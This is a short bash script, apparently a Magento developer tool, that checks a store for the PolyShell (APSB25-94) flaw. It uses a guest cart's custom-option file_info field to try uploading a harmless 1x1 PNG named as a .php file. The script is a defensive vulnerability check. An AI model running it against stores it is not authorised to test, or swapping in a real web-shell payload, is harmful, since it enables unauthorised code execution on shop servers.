#!/usr/bin/env bash
# Harmless PolyShell (APSB25-94) probe: tries to upload a 1x1 PNG named <name> via a guest-cart
# custom option file_info. Patched store answers "File uploads for custom options are not supported."
# Usage: BASE=https://example.com SKU=GMD25 [OPTION_ID=1] dev/tools/polyshell_probe.sh [name]
# OPTION_ID must be a real file-type option on SKU for the request to reach file processing
# (2.4.9 rejects unknown option ids first with "No such entity with option_id").
# If it ever succeeds, delete the written file under pub/media/custom_options/quote/.
BASE=${BASE:-https://magento.ddev.site}
SKU=${SKU:-GMD25}
OPTION_ID=${OPTION_ID:-1}
NAME=${1:-polyshell-probe.php}
PNG=iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGP4z8AAAAMBAQDJ/pLvAAAAAElFTkSuQmCC
CART=$(curl -sk -X POST "$BASE/rest/V1/guest-carts" -H 'Content-Type: application/json' | tr -d '"')
echo "cart=$CART"
curl -sk -X POST "$BASE/rest/V1/guest-carts/$CART/items" -H 'Content-Type: application/json' -d @- <<JSON
{"cartItem":{"sku":"$SKU","qty":1,"quote_id":"$CART","product_option":{"extension_attributes":{"custom_options":[{"option_id":"$OPTION_ID","option_value":"file","extension_attributes":{"file_info":{"base64_encoded_data":"$PNG","type":"image/png","name":"$NAME"}}}]}}}}
JSON
echo
